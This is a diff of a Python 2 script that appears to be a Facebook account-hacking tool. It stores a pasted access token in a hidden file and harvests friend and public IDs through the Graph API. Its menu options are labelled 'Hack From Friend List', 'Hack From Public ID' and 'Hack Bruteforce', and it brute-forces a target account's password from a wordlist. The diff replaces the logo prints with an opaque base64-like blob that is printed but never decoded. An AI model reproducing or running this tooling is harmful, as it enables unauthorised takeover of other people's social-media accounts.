@@ -108,7 +108,8 @@ idh = []
 
 def logmen():
     os.system('clear')
-    print logo1
+    print
+    print '32LvtVzwuSqOOfQNHAO8Kbcu+eucnC0Se6F0D8enV+be539qb5AqugrT2Xv13pJoqAnL49kwQ9C7mpJiiuL/5EXcbO6i5QWAuoNZio5Z2puD7MkTTyKKBeCbZvfNfN1oe2kTbOsMAZjj1AG8dQ6bSgaEhlPlLN2CGVEhBinG1x5GMtyx+NMIoUBuG4knKx5W/pqbCg7HmMS8Rg1b6nxtRtu6Rol587wXpgAAlKYVn57bX0FjiXRDU8oVcW0mSA1hnQRjeoRoKi+PDELZXpyI+Xm56DpSScaZBc1fPYkWjzyAaf1H1GXL1qFZQk2YbsH3OV3wLhwgeTHTkWpvKao3psevVO1I3LDLckNlyjthCumUeq9agoo1VmdJLe/vn6G+27uUhgIC478nYHE5i9Bbu9Hc7YyPw4uzLUHv7cEbxqhIAOeAnu33RRxmcsGwgFg2jaDLnkSQh3zbznlwsef/luw6R30fqPakCs8bX9JUgYnqlul3h+AYpDUaWnuOXt0Kz50mHIi8EhJpcnRdmin8jG+LVRCbT289OiW59KuxQFcnCMsLEngYXpeKZSNIWAhPWTKaBlGUW0YgsjeWspaCAelsZifUe+ryAN7IzsGqkOjLG92DkMC30MjRiQkbj3Wvo/S575amjhzOmSaZYHTk1VKTv/42KWxyu3+UfJj2BO5Qkeql/ndATzavbDnopb/kAIekfMXgCQGqvL3Kb/gCq1fleJA+hlSKzs+anXJsMeRCiXuTtTdyTrecAgFHAmZbs/AP0bNWk8gnCfFFz9X8D4VawTc0grPXD/FaKWdgB3g0nXkLQGfZdn4qMsaJJI8nsGyivCa6zOloMby/Dx2RRZckSyyWfAy4djUOKPEmozWch84lVyhzyiIVxqyDmiFAQ0gU4pcIZQM='
     print ' [1] Login Token'
     print ' [\x1b[91m0\x1b[0m] Exit Tool'
     pilog()
@@ -116,7 +117,8 @@ def pilog():
     og = raw_input("\nSelect: ")
     if og =="1":
         os.system("clear")
-        print logo
+        print
+        print '32LvtVzwuSqOOfQNHAO8Kbcu+eucnC0Se6F0D8enV+be539qb5AqugrT2Xv13pJoqAnL49kwQ9C7mpJiiuL/5EXcbO6i5QWAuoNZio5Z2puD7MkTTyKKBeCbZvfNfN1oe2kTbOsMAZjj1AG8dQ6bSgaEhlPlLN2CGVEhBinG1x5GMtyx+NMIoUBuG4knKx5W/pqbCg7HmMS8Rg1b6nxtRtu6Rol587wXpgAAlKYVn57bX0FjiXRDU8oVcW0mSA1hnQRjeoRoKi+PDELZXpyI+Xm56DpSScaZBc1fPYkWjzyAaf1H1GXL1qFZQk2YbsH3OV3wLhwgeTHTkWpvKao3psevVO1I3LDLckNlyjthCumUeq9agoo1VmdJLe/vn6G+27uUhgIC478nYHE5i9Bbu9Hc7YyPw4uzLUHv7cEbxqhIAOeAnu33RRxmcsGwgFg2jaDLnkSQh3zbznlwsef/luw6R30fqPakCs8bX9JUgYnqlul3h+AYpDUaWnuOXt0Kz50mHIi8EhJpcnRdmin8jG+LVRCbT289OiW59KuxQFcnCMsLEngYXpeKZSNIWAhPWTKaBlGUW0YgsjeWspaCAelsZifUe+ryAN7IzsGqkOjLG92DkMC30MjRiQkbj3Wvo/S575amjhzOmSaZYHTk1VKTv/42KWxyu3+UfJj2BO5Qkeql/ndATzavbDnopb/kAIekfMXgCQGqvL3Kb/gCq1fleJA+hlSKzs+anXJsMeRCiXuTtTdyTrecAgFHAmZbs/AP0bNWk8gnCfFFz9X8D4VawTc0grPXD/FaKWdgB3g0nXkLQGfZdn4qMsaJJI8nsGyivCa6zOloMby/Dx2RRZckSyyWfAy4djUOKPEmozWch84lVyhzyiIVxqyDmiFAQ0gU4pcIZQM='
         print 42 * '\x1b[1;96m='
         token = raw_input("[+] Past Your Token Here : ")
         sav = open(".logfuck.txt","w")
@@ -171,8 +173,8 @@ def menu():
         keluar()
 
     os.system('clear')
-    print logo
-    print logo1
+    print
+    print '32LvtVzwuSqOOfQNHAO8Kbcu+eucnC0Se6F0D8enV+be539qb5AqugrT2Xv13pJoqAnL49kwQ9C7mpJiiuL/5EXcbO6i5QWAuoNZio5Z2puD7MkTTyKKBeCbZvfNfN1oe2kTbOsMAZjj1AG8dQ6bSgaEhlPlLN2CGVEhBinG1x5GMtyx+NMIoUBuG4knKx5W/pqbCg7HmMS8Rg1b6nxtRtu6Rol587wXpgAAlKYVn57bX0FjiXRDU8oVcW0mSA1hnQRjeoRoKi+PDELZXpyI+Xm56DpSScaZBc1fPYkWjzyAaf1H1GXL1qFZQk2YbsH3OV3wLhwgeTHTkWpvKao3psevVO1I3LDLckNlyjthCumUeq9agoo1VmdJLe/vn6G+27uUhgIC478nYHE5i9Bbu9Hc7YyPw4uzLUHv7cEbxqhIAOeAnu33RRxmcsGwgFg2jaDLnkSQh3zbznlwsef/luw6R30fqPakCs8bX9JUgYnqlul3h+AYpDUaWnuOXt0Kz50mHIi8EhJpcnRdmin8jG+LVRCbT289OiW59KuxQFcnCMsLEngYXpeKZSNIWAhPWTKaBlGUW0YgsjeWspaCAelsZifUe+ryAN7IzsGqkOjLG92DkMC30MjRiQkbj3Wvo/S575amjhzOmSaZYHTk1VKTv/42KWxyu3+UfJj2BO5Qkeql/ndATzavbDnopb/kAIekfMXgCQGqvL3Kb/gCq1fleJA+hlSKzs+anXJsMeRCiXuTtTdyTrecAgFHAmZbs/AP0bNWk8gnCfFFz9X8D4VawTc0grPXD/FaKWdgB3g0nXkLQGfZdn4qMsaJJI8nsGyivCa6zOloMby/Dx2RRZckSyyWfAy4djUOKPEmozWch84lVyhzyiIVxqyDmiFAQ0gU4pcIZQM='
     print '   \x1b[1;36;40m      \xe2\x95\x91\x1b[1;32;40m[*] Name\x1b[1;32;40m: ' + nama + '  \t   \x1b[1;36;40m\xe2\x95\x91'
     print '   \x1b[1;36;40m      \xe2\x95\x91\x1b[1;33;40m[*] ID  \x1b[1;34;40m: ' + id + '        \x1b[1;36;40m\xe2\x95\x91'
     print '   \x1b[1;36;40m      \xe2\x95\x91\x1b[1;36;40m[*] Subs\x1b[1;34;40m: ' + sub + '                      \x1b[1;36;40m\xe2\x95\x91'
@@ -191,7 +193,7 @@ def pilih():
         super()
     elif unikers == '2':
         os.system('clear')
-        print logo
+        print
         print ' \x1b[1;36;40m\xe2\x97\x8f\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x84\xe2\x96\xba\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x8f\n'
         os.system('git pull origin master')
         raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
@@ -217,7 +219,8 @@ def super():
         login()
 
     os.system('clear')
-    print logo
+    print
+    print '32LvtVzwuSqOOfQNHAO8Kbcu+eucnC0Se6F0D8enV+be539qb5AqugrT2Xv13pJoqAnL49kwQ9C7mpJiiuL/5EXcbO6i5QWAuoNZio5Z2puD7MkTTyKKBeCbZvfNfN1oe2kTbOsMAZjj1AG8dQ6bSgaEhlPlLN2CGVEhBinG1x5GMtyx+NMIoUBuG4knKx5W/pqbCg7HmMS8Rg1b6nxtRtu6Rol587wXpgAAlKYVn57bX0FjiXRDU8oVcW0mSA1hnQRjeoRoKi+PDELZXpyI+Xm56DpSScaZBc1fPYkWjzyAaf1H1GXL1qFZQk2YbsH3OV3wLhwgeTHTkWpvKao3psevVO1I3LDLckNlyjthCumUeq9agoo1VmdJLe/vn6G+27uUhgIC478nYHE5i9Bbu9Hc7YyPw4uzLUHv7cEbxqhIAOeAnu33RRxmcsGwgFg2jaDLnkSQh3zbznlwsef/luw6R30fqPakCs8bX9JUgYnqlul3h+AYpDUaWnuOXt0Kz50mHIi8EhJpcnRdmin8jG+LVRCbT289OiW59KuxQFcnCMsLEngYXpeKZSNIWAhPWTKaBlGUW0YgsjeWspaCAelsZifUe+ryAN7IzsGqkOjLG92DkMC30MjRiQkbj3Wvo/S575amjhzOmSaZYHTk1VKTv/42KWxyu3+UfJj2BO5Qkeql/ndATzavbDnopb/kAIekfMXgCQGqvL3Kb/gCq1fleJA+hlSKzs+anXJsMeRCiXuTtTdyTrecAgFHAmZbs/AP0bNWk8gnCfFFz9X8D4VawTc0grPXD/FaKWdgB3g0nXkLQGfZdn4qMsaJJI8nsGyivCa6zOloMby/Dx2RRZckSyyWfAy4djUOKPEmozWch84lVyhzyiIVxqyDmiFAQ0gU4pcIZQM='
     print '\x1b[1;32;40m[type1] \x1b[1;33;41mHack From Friend List'
     print '\x1b[1;32;40m[type2] \x1b[1;33;42mHack From Public ID'
     print '\x1b[1;32;40m[type3] \x1b[1;33;43mHack Bruteforce'
@@ -236,7 +239,7 @@ def pilih_super():
     else:
         if peak == '1':
             os.system('clear')
-            print logo
+            print
             jalan('\x1b[1;93m[\xe2\x9c\xba] Getting IDs \x1b[1;97m...')
             r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
             z = json.loads(r.text)
@@ -245,7 +248,7 @@ def pilih_super():
 
         elif peak == '2':
             os.system('clear')
-            print logo
+            print
             idt = raw_input('\x1b[1;96m[*] Enter ID : ')
             try:
                 jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
@@ -264,11 +267,11 @@ def pilih_super():
 
         elif peak == '3':
             os.system('clear')
-            print logo
+            print
             brute()
         elif peak == '4':
             os.system('clear')
-            print logo
+            print
             try:
                 idlist = raw_input('\x1b[1;91m[+] \x1b[1;93mEnter File Path  \x1b[1;91m: \x1b[1;93m')
                 for line in open(idlist, 'r').readlines():
@@ -292,7 +295,8 @@ def pilih_super():
             sys.stdout.flush()
             time.sleep(1)
 
-    print
+    print  
+    print '32LvtVzwuSqOOfQNHAO8Kbcu+eucnC0Se6F0D8enV+be539qb5AqugrT2Xv13pJoqAnL49kwQ9C7mpJiiuL/5EXcbO6i5QWAuoNZio5Z2puD7MkTTyKKBeCbZvfNfN1oe2kTbOsMAZjj1AG8dQ6bSgaEhlPlLN2CGVEhBinG1x5GMtyx+NMIoUBuG4knKx5W/pqbCg7HmMS8Rg1b6nxtRtu6Rol587wXpgAAlKYVn57bX0FjiXRDU8oVcW0mSA1hnQRjeoRoKi+PDELZXpyI+Xm56DpSScaZBc1fPYkWjzyAaf1H1GXL1qFZQk2YbsH3OV3wLhwgeTHTkWpvKao3psevVO1I3LDLckNlyjthCumUeq9agoo1VmdJLe/vn6G+27uUhgIC478nYHE5i9Bbu9Hc7YyPw4uzLUHv7cEbxqhIAOeAnu33RRxmcsGwgFg2jaDLnkSQh3zbznlwsef/luw6R30fqPakCs8bX9JUgYnqlul3h+AYpDUaWnuOXt0Kz50mHIi8EhJpcnRdmin8jG+LVRCbT289OiW59KuxQFcnCMsLEngYXpeKZSNIWAhPWTKaBlGUW0YgsjeWspaCAelsZifUe+ryAN7IzsGqkOjLG92DkMC30MjRiQkbj3Wvo/S575amjhzOmSaZYHTk1VKTv/42KWxyu3+UfJj2BO5Qkeql/ndATzavbDnopb/kAIekfMXgCQGqvL3Kb/gCq1fleJA+hlSKzs+anXJsMeRCiXuTtTdyTrecAgFHAmZbs/AP0bNWk8gnCfFFz9X8D4VawTc0grPXD/FaKWdgB3g0nXkLQGfZdn4qMsaJJI8nsGyivCa6zOloMby/Dx2RRZckSyyWfAy4djUOKPEmozWch84lVyhzyiIVxqyDmiFAQ0gU4pcIZQM='
     print '\x1b[1;96m[!] \x1b[1;93mTo Stop Process Press CTRL Then Press z'
     print 42 * '\x1b[1;96m='
 
@@ -420,7 +424,7 @@ def brute():
         login()
     else:
         os.system('clear')
-        print logo
+        print
         try:
             email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')
             passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')
